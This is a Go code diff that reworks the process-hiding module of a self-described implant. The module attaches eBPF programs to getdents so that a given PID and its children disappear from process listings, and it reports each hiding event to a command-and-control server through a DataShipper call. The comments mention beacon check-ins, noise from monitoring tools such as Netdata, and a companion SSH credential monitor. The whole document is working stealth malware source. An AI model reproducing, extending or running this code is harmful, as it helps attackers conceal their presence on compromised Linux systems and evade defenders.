@@ -7,19 +7,16 @@ import (
 	"context"
 	"encoding/binary"
 	"fmt"
-	"log"
-	"os"
-	"os/signal"
-	"sync"
 	"slices"
 	"strconv"
 	"strings"
-	"syscall"
+	"galleon/agent_config"
 
 	"github.com/cilium/ebpf/link"
 	"github.com/cilium/ebpf/ringbuf"
 	"github.com/cilium/ebpf/rlimit"
 )
+// TODO: As of right now we have to way to umask a pid once it is hidden. We need a way to unhide a pid.
 
 const (
 	prog01 = 1
@@ -40,10 +37,6 @@ type Worker struct {
 	done chan struct{}
 }
 
-type SafeCounter struct {
-	mu sync.Mutex
-}
-
 var (
 	pidsHidden = []int{}
 )
@@ -53,7 +46,9 @@ func (w *Worker) Stop() {
 	<-w.done
 }
 
-func argsToPids(args string) (int, int, error) {
+var c = agent_config.PidHiderSafeCounter{}
+
+func argsToPids(args string, c *agent_config.PidHiderSafeCounter) (int, int, error) {
 	argsParts := strings.Fields(args)
 	if len(argsParts) != 2 {
 		return 0, 0, fmt.Errorf("invalid args: %s", args)
@@ -68,13 +63,15 @@ func argsToPids(args string) (int, int, error) {
 		return 0, 0, fmt.Errorf("invalid PPID: %s, error: %v", args, err)
 	}
 
+	c.Mu.Lock()
+	defer c.Mu.Unlock()
 	if slices.Contains(pidsHidden, pid) {
 		return 0, 0, fmt.Errorf("pid %s is already hidden", args)
 	}
 	return pid, targetPPID, nil
 }
 
-func startWorker(ctx context.Context, reader *ringbuf.Reader, cleanup func()) *Worker {
+func startWorker(serverUrl string, taskData map[string]interface{}, ctx context.Context, reader *ringbuf.Reader, cleanup func()) *Worker {
     ctx, cancel := context.WithCancel(ctx)
 
     w := &Worker{
@@ -98,7 +95,7 @@ func startWorker(ctx context.Context, reader *ringbuf.Reader, cleanup func()) *W
                     return
                 }
 
-                log.Printf("ringbuf read: %v", err)
+                DataShipper(serverUrl, taskData, fmt.Sprintf("ringbuf read: %v", err))
                 continue
             }
 
@@ -108,13 +105,18 @@ func startWorker(ctx context.Context, reader *ringbuf.Reader, cleanup func()) *W
                 binary.LittleEndian,
                 &e,
             ); err != nil {
-                log.Printf("decode event: %v", err)
+                DataShipper(serverUrl, taskData, fmt.Sprintf("decode event: %v", err))
                 continue
             }
 
             comm := strings.TrimRight(string(e.Comm[:]), "\x00")
-            log.Printf("pid=%d comm=%s success=%t",
-                e.Pid, comm, e.Success != 0)
+			// if something is attempting to access the hidden pid, it will send message back to the server with the pid, comm, and 
+			// if we were successful or not at hiding the pid. The problem here is that it will just send it no matter what the callback
+			// interval of the implant is. So in the case of a program like Netdata that will always poll for pids on the system
+			// it will cause the implant to yell out to the server everytime it polls (1s interval). We need to limit this and send it back 
+			// during routine beacon check in
+			// same goes for the ssh credential monitor. That has the same bad pattern as this here.
+            DataShipper(serverUrl, taskData, fmt.Sprintf("pid=%d comm=%s success=%t", e.Pid, comm, e.Success != 0))
         }
     }()
 
@@ -123,9 +125,10 @@ func startWorker(ctx context.Context, reader *ringbuf.Reader, cleanup func()) *W
 
 // args come in as pid (to hide) and ppid (to hide all children of that pid) space separated.
 func PidHiderHandler(serverUrl string, taskData map[string]interface{}) {
+	
 	args := strings.TrimSpace(strings.ToLower(taskData["args"].(string)))
 
-	pid, targetPPID, err := argsToPids(args)
+	pid, targetPPID, err := argsToPids(args, &c)
 	if err != nil {
 		DataShipper(serverUrl, taskData, fmt.Sprintf("%v", err))
 		return
@@ -213,6 +216,7 @@ func PidHiderHandler(serverUrl string, taskData map[string]interface{}) {
 		uint32(prog01),
 		uint32(objs.HandleGetdentsExit.FD()),
 	); err != nil {
+		objs.Close()
 		DataShipper(serverUrl, taskData, fmt.Sprintf("install tail call 1: %v", err))
 		return
 	}
@@ -221,6 +225,7 @@ func PidHiderHandler(serverUrl string, taskData map[string]interface{}) {
 		uint32(prog02),
 		uint32(objs.HandleGetdentsPatch.FD()),
 	); err != nil {
+		objs.Close()
 		DataShipper(serverUrl, taskData, fmt.Sprintf("install tail call 2: %v", err))
 		return
 	}
@@ -235,6 +240,7 @@ func PidHiderHandler(serverUrl string, taskData map[string]interface{}) {
 		nil,
 	)
 	if err != nil {
+		objs.Close()
 		DataShipper(serverUrl, taskData, fmt.Sprintf("attach enter tracepoint: %v", err))
 		return
 	}
@@ -252,6 +258,8 @@ func PidHiderHandler(serverUrl string, taskData map[string]interface{}) {
 		nil,
 	)
 	if err != nil {
+		enterLink.Close()
+		objs.Close()
 		DataShipper(serverUrl, taskData, fmt.Sprintf("attach exit tracepoint: %v", err))
 		return
 	}
@@ -264,17 +272,20 @@ func PidHiderHandler(serverUrl string, taskData map[string]interface{}) {
 	*/
 	reader, err := ringbuf.NewReader(objs.Rb)
 	if err != nil {
+		exitLink.Close()
+		enterLink.Close()
+		objs.Close()
 		DataShipper(serverUrl, taskData, fmt.Sprintf("open ring buffer: %v", err))
 		return
 	}
 
 	// at this point the pid is hidden 
-	var c = SafeCounter{}
-	c.mu.Lock()
+	c.Mu.Lock()
 	pidsHidden = append(pidsHidden, pid)
-	c.mu.Unlock()
+	c.Mu.Unlock()
 
-	worker := startWorker(agentCtx, reader,
+	agentCtx := context.Background()
+	startWorker(serverUrl, taskData, agentCtx, reader,
 		func() {
 			reader.Close()
 			exitLink.Close()
@@ -282,4 +293,8 @@ func PidHiderHandler(serverUrl string, taskData map[string]interface{}) {
 			objs.Close()
 		},
 	)
+	// if targetPPID was unused and we hid a pid, targetPPID should be 0
+	// how we can tell on the client side. Client side will sort it out
+	DataShipper(serverUrl, taskData, fmt.Sprintf("pid: %v hidden, targetPPID %v hidden", pid, targetPPID))
+
 }
